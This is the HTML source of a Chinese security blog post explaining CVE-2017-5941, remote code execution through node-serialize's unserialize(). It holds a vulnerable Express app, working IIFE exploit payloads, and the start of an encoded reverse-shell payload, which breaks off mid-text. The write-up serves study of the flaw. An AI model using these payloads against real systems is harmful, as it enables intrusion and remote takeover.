@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="漏洞介绍 漏洞名称：Exploiting Node.js deserialization bug for Remote Code Execution 漏洞CVE id：CVE-2017-5941 漏洞类型：代码执行 漏洞简介： 不可信的数据传入了unserialize()函数，这导致我们可以通过传递带有立即调用函数表达式（IIFE）的JavaScript对象来实现任意代码执行。 漏洞详情 在Nod">
+<meta name="keywords" content="CVE,反序列化,Nodejs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nodejs反序列化">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/26/2018-12-27-NodeJs/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="漏洞介绍 漏洞名称：Exploiting Node.js deserialization bug for Remote Code Execution 漏洞CVE id：CVE-2017-5941 漏洞类型：代码执行 漏洞简介： 不可信的数据传入了unserialize()函数，这导致我们可以通过传递带有立即调用函数表达式（IIFE）的JavaScript对象来实现任意代码执行。 漏洞详情 在Nod">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5j0hq0xj20vw03emxn.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5jwqypjj218g0pngxz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5jh4sxwj20ug0fogn0.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5kdk3jkj218g0kwb29.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5kl8yprj20go0c8gnh.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.220Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Nodejs反序列化">
+<meta name="twitter:description" content="漏洞介绍 漏洞名称：Exploiting Node.js deserialization bug for Remote Code Execution 漏洞CVE id：CVE-2017-5941 漏洞类型：代码执行 漏洞简介： 不可信的数据传入了unserialize()函数，这导致我们可以通过传递带有立即调用函数表达式（IIFE）的JavaScript对象来实现任意代码执行。 漏洞详情 在Nod">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5j0hq0xj20vw03emxn.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/26/2018-12-27-NodeJs/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Nodejs反序列化 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/26/2018-12-27-NodeJs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Nodejs反序列化
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-26 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-26T00:00:00+08:00">2018-12-26</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">8.6k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">8 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p><strong>漏洞介绍</strong></p>
+<p><strong>漏洞名称：</strong>Exploiting Node.js deserialization bug for Remote Code Execution</p>
+<p><strong>漏洞CVE id</strong>：CVE-2017-5941</p>
+<p><strong>漏洞类型：</strong>代码执行</p>
+<p><strong>漏洞简介：</strong></p>
+<p><strong>不可信的数据传入了unserialize()函数，这导致我们可以通过传递带有立即调用函数表达式（IIFE）的JavaScript对象来实现任意代码执行。</strong></p>
+<p><strong>漏洞详情</strong></p>
+<p>在Node.js代码审查期间，我碰巧看到了一个序列化/反序列化模块命名为node-serialize。cookie的值来自请求然后被传递到模块提供的unserialize()函数。下面是一个示例的node.js应用程序：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">escape</span> = <span class="built_in">require</span>(<span class="string">'escape-html'</span>);</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.use(cookieParser())</span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.cookies.profile) &#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="keyword">new</span> Buffer(req.cookies.profile,<span class="string">'base64'</span>).toStrin();</span><br><span class="line">        <span class="keyword">var</span> obj = serialize.unserialize(str);</span><br><span class="line">    <span class="keyword">if</span> (obj.username)&#123;</span><br><span class="line">    res.send(<span class="string">"Hello "</span> + <span class="built_in">escape</span>(obj.username));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">res.cookie(<span class="string">'profile'</span>,<span class="string">"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5Ijo</span></span><br><span class="line"><span class="string">iYmFuZ2Fsb3JlIn0="</span>,&#123; <span class="attr">maxAge</span>: <span class="number">900000</span>, <span class="attr">httpOnly</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line">res.send(<span class="string">"Hello World"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Java，PHP，Ruby和Python也有着大量的反序列化问题</p>
+<p><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/" target="_blank" rel="noopener">Understanding PHP Object Injection</a></p>
+<p><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" target="_blank" rel="noopener">Java Deserialization Cheat Sheet</a></p>
+<p><a href="http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/" target="_blank" rel="noopener">Rails Remote Code Execution Vulnerability Explained</a></p>
+<p><a href="https://www.cs.uic.edu/~s/musings/pickle/" target="_blank" rel="noopener">Arbitrary code execution with Python pickles</a></p>
+<p>但是我找不到任何解释反序列化/对象的资源来解释Node.js中的注入BUG。</p>
+<p><strong>Building the Payload</strong></p>
+<p>我使用node-serialize version 0.0.4进行研究，为了成功利用当不可信数据传递到unserialize()函数时，执行任意代码。创建Payload的最好方法就是使用同一模块的serialize()函数。</p>
+<p>我创建了以下JavaScript对象并将其传递给serialize()函数。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error,</span></span></span><br><span class="line"><span class="function"><span class="params">stdout, stderr</span>) </span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized: n"</span> + serialize.serialize(y));</span><br></pre></td></tr></table></figure>
+
+<p>输出如下：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5j0hq0xj20vw03emxn.jpg" alt></p>
+<p>现在我们有一个序列化的字符串，可以通过unserialize()函数进行反序列化，但问题是代码执行不会发生，直到你触发对应于对象的rce属性的函数。后来我想出，我们可以使用JavaScript的立即调用函数表达式（IIFE）来调用该函数。如果我们在函数体之后使用括号()，当对象被创建时，函数将被调用。 它的工作方式类似于C ++中的类构造函数。</p>
+<p>代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error,</span></span></span><br><span class="line"><span class="function"><span class="params">stdout, stderr</span>) </span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized: n"</span> + serialize.serialize(y));</span><br></pre></td></tr></table></figure>
+
+<p>获得以下输出</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5jwqypjj218g0pngxz.jpg" alt></p>
+<p>IIFE工作正常，但序列化失败。所以我试图在以前序列化的字符串的函数体后添加括号()。并将其传递给unserialize()函数，幸运的它成功了。所以我们有Exploit Payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function ()&#123;n t</span></span><br><span class="line"><span class="string">require('child_process').exec('ls /', function(error, stdout, stderr) &#123;</span></span><br><span class="line"><span class="string">console.log(stdout) &#125;);n &#125;()"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将它传递给unserialize()函数将导致代码执行。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function</span></span><br><span class="line"><span class="string">()&#123;require('</span>child_process<span class="string">').exec('</span>ls /<span class="string">',</span></span><br><span class="line"><span class="string">function(error, stdout, stderr) &#123; console.log(stdout)</span></span><br><span class="line"><span class="string">&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>
+
+<p>演示：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl5jh4sxwj20ug0fogn0.jpg" alt></p>
+<p>现在我们知道我们可以利用node-serialize模块中的unserialize()函数。现在让我们来利用漏洞生成一个反向shell。</p>
+<p><strong>Further Exploitation</strong></p>
+<p>Web应用程序中的漏洞是它从HTTP请求中读取名为profile的cookie，对cookie值执行base64解码，并将其传递给unserialize()函数。由于cookie是不受信任的输入，攻击者可以制作恶意Cookie值以利用此漏洞。</p>
+<p>我使用nodejsshell.py生成反向shell有效负载。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ python nodejsshell.py <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1337</span></span><br><span class="line">[+] LHOST = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">[+] LPORT = <span class="number">1337</span></span><br><span class="line">[+] Encoding</span><br><span class="line">eval(String.fromCharCode(<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">10</span></span><br><span class="line"><span class="number">5</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">3</span></span><br><span class="line"><span class="number">2</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">11</span></span><br><span class="line"><span class="number">5</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">55</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">46</span>,</span><br><span class="line"><span class="number">49</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">77</span>,<span class="number">69</span>,<span class="number">79</span>,<span class="number">85</span>,<span class="number">84</span>,<span class="number">61</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">4</span></span><br><span class="line"><span class="number">8</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">34</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">111</span>,<span class="number">102</span>,<span class="number">32</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span></span><br><span class="line">,<span class="number">46</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">6</span></span><br><span class="line"><span class="number">1</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">32</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">11</span></span><br><span class="line"><span class="number">0</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">3</span></span><br><span class="line"><span class="number">2</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">1</span></span><br><span class="line"><span class="number">14</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">79</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">105</span>,<span class="number">116</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">61</span>,<span class="number">3</span></span><br><span class="line"><span class="number">2</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">125</span>,<span class="number">10</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">8</span></span><br><span class="line"><span class="number">4</span>,<span class="number">44</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">32</span></span><br><span class="line">,<span class="number">61</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">83</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">3</span></span><br><span class="line"><span class="number">2</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">105</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">79</span>,</span><br><span class="line"><span class="number">83</span>,<span class="number">84</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">123</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">3</span></span><br><span class="line"><span class="number">2</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span 